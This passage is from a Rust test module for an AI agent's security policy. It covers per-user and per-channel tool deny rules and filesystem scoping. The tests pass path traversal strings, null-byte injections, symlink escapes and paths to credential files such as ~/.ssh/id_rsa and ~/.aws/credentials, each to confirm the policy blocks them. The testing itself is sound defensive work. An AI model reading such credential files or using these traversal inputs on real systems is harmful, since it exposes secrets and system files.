                tools_allow: vec!["shell".into(), "memory_recall".into()],
                tools_deny: vec!["shell".into()],
            }],
            true,
        );
        assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
        assert!(p.is_tool_allowed("memory_recall", "uuid:alice", "signal", "direct"));
    }

    #[test]
    fn wildcard_user_matches_any_sender() {
        let p = make_scope_policy(
            vec![crate::config::ScopeRule {
                user: Some("*".into()),
                channel: None,
                chat_type: None,
                tools_allow: vec![],
                tools_deny: vec!["file_write".into()],
            }],
            true,
        );
        assert!(!p.is_tool_allowed("file_write", "uuid:anyone", "signal", "direct"));
        assert!(!p.is_tool_allowed("file_write", "uuid:someoneelse", "telegram", "group"));
        assert!(p.is_tool_allowed("memory_recall", "uuid:anyone", "signal", "direct"));
    }

    #[test]
    fn rules_evaluated_top_to_bottom_first_match_wins() {
        // Rule 1: deny shell for signal groups
        // Rule 2: allow all for alice
        // alice in a signal group: Rule 1 matches first → shell denied
        let p = make_scope_policy(
            vec![
                crate::config::ScopeRule {
                    user: None,
                    channel: Some("signal".into()),
                    chat_type: Some("group".into()),
                    tools_allow: vec![],
                    tools_deny: vec!["shell".into()],
                },
                crate::config::ScopeRule {
                    user: Some("uuid:alice".into()),
                    channel: None,
                    chat_type: None,
                    tools_allow: vec![],
                    tools_deny: vec![],
                },
            ],
            true,
        );
        // Rule 1 matches: signal+group → shell denied for alice
        assert!(!p.is_tool_allowed("shell", "uuid:alice", "signal", "group"));
        // Rule 1 doesn't match direct → fallthrough to Rule 2 (no restrictions) → allow
        assert!(p.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
    }

    #[test]
    fn scope_config_from_autonomy_config() {
        let autonomy = crate::config::AutonomyConfig {
            scopes: crate::config::ScopeConfig {
                default: "allow".into(),
                rules: vec![crate::config::ScopeRule {
                    user: None,
                    channel: Some("signal".into()),
                    chat_type: Some("group".into()),
                    tools_allow: vec![],
                    tools_deny: vec!["shell".into()],
                }],
            },
            ..crate::config::AutonomyConfig::default()
        };
        let policy = SecurityPolicy::from_config(&autonomy, std::path::Path::new("/tmp"));

        assert!(policy.scope_default_allow);
        assert_eq!(policy.scope_rules.len(), 1);
        // shell blocked in signal groups
        assert!(!policy.is_tool_allowed("shell", "uuid:alice", "signal", "group"));
        // shell allowed in direct
        assert!(policy.is_tool_allowed("shell", "uuid:alice", "signal", "direct"));
    }

    // ── Edge cases: from_config preserves tracker ────────────

    #[test]
    fn from_config_creates_fresh_tracker() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            workspace_only: false,
            forbidden_paths: vec![],
            max_actions_per_hour: 10,
            max_cost_per_day_cents: 100,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);
        assert_eq!(policy.tracker.count(), 0);
        assert!(!policy.is_rate_limited());
    }

    // ══════════════════════════════════════════════════════════
    // SECURITY CHECKLIST TESTS
    // Checklist: gateway not public, pairing required,
    //            filesystem scoped (no /), access via tunnel
    // ══════════════════════════════════════════════════════════

    // ── Checklist #3: Filesystem scoped (no /) ──────────────

    #[test]
    fn checklist_root_path_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/"));
        assert!(!p.is_path_allowed("/anything"));
    }

    #[test]
    fn checklist_all_system_dirs_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for dir in [
            "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev", "/proc", "/sys",
            "/var", "/tmp",
        ] {
            assert!(!p.is_path_allowed(dir), "System dir should be blocked: {dir}");
            assert!(
                !p.is_path_allowed(&format!("{dir}/subpath")),
                "Subpath of system dir should be blocked: {dir}/subpath"
            );
        }
    }

    #[test]
    fn checklist_sensitive_dotfiles_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        for path in [
            "~/.ssh/id_rsa",
            "~/.gnupg/secring.gpg",
            "~/.aws/credentials",
            "~/.config/secrets",
        ] {
            assert!(!p.is_path_allowed(path), "Sensitive dotfile should be blocked: {path}");
        }
    }

    #[test]
    fn checklist_null_byte_injection_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("safe\0/../../../etc/passwd"));
        assert!(!p.is_path_allowed("\0"));
        assert!(!p.is_path_allowed("file\0"));
    }

    #[test]
    fn checklist_workspace_only_blocks_all_absolute() {
        let p = SecurityPolicy {
            workspace_only: true,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/any/absolute/path"));
        assert!(p.is_path_allowed("relative/path.txt"));
    }

    #[test]
    fn checklist_resolved_path_must_be_in_workspace() {
        let p = SecurityPolicy {
            workspace_dir: PathBuf::from("/home/user/project"),
            ..SecurityPolicy::default()
        };
        // Inside workspace — allowed
        assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
        // Outside workspace — blocked (symlink escape)
        assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
        assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
        // Root — blocked
        assert!(!p.is_resolved_path_allowed(Path::new("/")));
    }

    #[test]
    fn resolved_path_check_disabled_when_workspace_only_is_false() {
        let p = SecurityPolicy {
            workspace_only: false,
            workspace_dir: PathBuf::from("/home/user/project"),
            ..SecurityPolicy::default()
        };
        assert!(p.is_resolved_path_allowed(Path::new("/etc/passwd")));
        assert!(p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
    }

    #[test]
    fn checklist_default_policy_is_workspace_only() {
        let p = SecurityPolicy::default();
        assert!(p.workspace_only, "Default policy must be workspace_only=true");
    }

    #[test]
    fn checklist_default_forbidden_paths_comprehensive() {
        let p = SecurityPolicy::default();
        // Must contain all critical system dirs
        for dir in ["/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp"] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dir),
                "Default forbidden_paths must include {dir}"
            );
        }
        // Must contain sensitive dotfiles
        for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
            assert!(
                p.forbidden_paths.iter().any(|f| f == dot),
                "Default forbidden_paths must include {dot}"
            );
        }
    }

    // ── §1.2 Path resolution / symlink bypass tests ──────────

    #[test]
    fn resolved_path_blocks_outside_workspace() {
        let workspace = std::env::temp_dir().join("openprx_test_resolved_path");
        let _ = std::fs::create_dir_all(&workspace);

        // Use the canonicalized workspace so starts_with checks match
        let canonical_workspace = workspace.canonicalize().unwrap_or_else(|_| workspace.clone());

        let policy = SecurityPolicy {
            workspace_dir: canonical_workspace.clone(),
            ..SecurityPolicy::default()
        };

        // A resolved path inside the workspace should be allowed
        let inside = canonical_workspace.join("subdir").join("file.txt");
        assert!(
            policy.is_resolved_path_allowed(&inside),
            "path inside workspace should be allowed"
        );

        // A resolved path outside the workspace should be blocked
        let canonical_temp = std::env::temp_dir()
            .canonicalize()
            .unwrap_or_else(|_| std::env::temp_dir());
        let outside = canonical_temp.join("outside_workspace_openprx");
        assert!(
            !policy.is_resolved_path_allowed(&outside),
            "path outside workspace must be blocked"
        );

        let _ = std::fs::remove_dir_all(&workspace);
    }

    #[test]
    fn resolved_path_blocks_root_escape() {
        let policy = SecurityPolicy {
            workspace_dir: PathBuf::from("/home/openprx_user/project"),
            ..SecurityPolicy::default()
        };

        assert!(
            !policy.is_resolved_path_allowed(Path::new("/etc/passwd")),
            "resolved path to /etc/passwd must be blocked"
        );
        assert!(
            !policy.is_resolved_path_allowed(Path::new("/root/.bashrc")),
            "resolved path to /root/.bashrc must be blocked"
        );
    }

    #[cfg(unix)]
    #[test]
    fn resolved_path_blocks_symlink_escape() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join("openprx_test_symlink_escape");
        let workspace = root.join("workspace");
        let outside = root.join("outside_target");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&workspace).unwrap();
        std::fs::create_dir_all(&outside).unwrap();

        // Create a symlink inside workspace pointing outside
        let link_path = workspace.join("escape_link");
        symlink(&outside, &link_path).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace,
            ..SecurityPolicy::default()
        };

        // The resolved symlink target should be outside workspace
        let resolved = link_path.canonicalize().unwrap();
        assert!(
            !policy.is_resolved_path_allowed(&resolved),
            "symlink-resolved path outside workspace must be blocked"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn is_path_allowed_blocks_null_bytes() {
        let policy = default_policy();
        assert!(
            !policy.is_path_allowed("file\0.txt"),
            "paths with null bytes must be blocked"
        );
    }

    #[test]
    fn is_path_allowed_blocks_url_encoded_traversal() {
        let policy = default_policy();
        assert!(
            !policy.is_path_allowed("..%2fetc%2fpasswd"),
            "URL-encoded path traversal must be blocked"
        );
        assert!(
            !policy.is_path_allowed("subdir%2f..%2f..%2fetc"),
            "URL-encoded parent dir traversal must be blocked"
        );
    }

    // ── Platform / cross-OS path handling ───────────────────────

    #[test]
    fn backslash_path_treated_as_traversal_on_all_platforms() {
        // On Unix, backslash is a valid filename character but is commonly
        // used for Windows path traversal. The policy should handle it
        // gracefully regardless of platform.
        let policy = SecurityPolicy::default();
        // These should not crash or panic on any platform
        let _ = policy.is_path_allowed("foo\\bar");
        let _ = policy.is_path_allowed("..\\..\\etc\\passwd");
        let _ = policy.is_path_allowed("C:\\Windows\\System32");
    }

    #[test]
    fn path_with_mixed_separators() {
        let policy = SecurityPolicy::default();
        // Mixed forward/backslash should not bypass traversal detection
        let _ = policy.is_path_allowed("foo/bar\\baz");
        let _ = policy.is_path_allowed("..\\foo/../bar");
    }

    #[test]
    fn absolute_path_blocking_works_on_workspace_only() {
        let policy = SecurityPolicy {
            workspace_only: true,
            workspace_dir: std::env::temp_dir(),
            ..SecurityPolicy::default()
        };
        // Unix absolute
        assert!(!policy.is_path_allowed("/etc/passwd"));
        // Relative is allowed
        assert!(policy.is_path_allowed("relative/file.txt"));
    }

    #[cfg(unix)]
    #[test]
    fn resolved_path_symlink_escape_blocked() {
        use std::path::Path;
        let policy = SecurityPolicy {
            workspace_dir: std::env::temp_dir().join("test-workspace"),
            ..SecurityPolicy::default()
        };
        // Path that escapes workspace root
        let outside = Path::new("/etc/passwd");
        assert!(!policy.is_resolved_path_allowed(outside));
    }

    #[test]
    fn forbidden_paths_block_subpaths() {
        let policy = SecurityPolicy {
            forbidden_paths: vec!["/secret".to_string()],
            ..SecurityPolicy::default()
        };
        assert!(!policy.is_path_allowed("/secret/data.txt"));
        assert!(!policy.is_path_allowed("/secret"));
    }

    #[test]
    fn empty_path_is_allowed() {
        let policy = SecurityPolicy::default();
        // Empty path is not traversal, not null, not forbidden
        assert!(policy.is_path_allowed(""));
    }

    #[test]
    fn unicode_path_does_not_panic() {
        let policy = SecurityPolicy::default();
        assert!(policy.is_path_allowed("文档/笔记.md"));
        assert!(policy.is_path_allowed("données/résumé.txt"));
    }
}
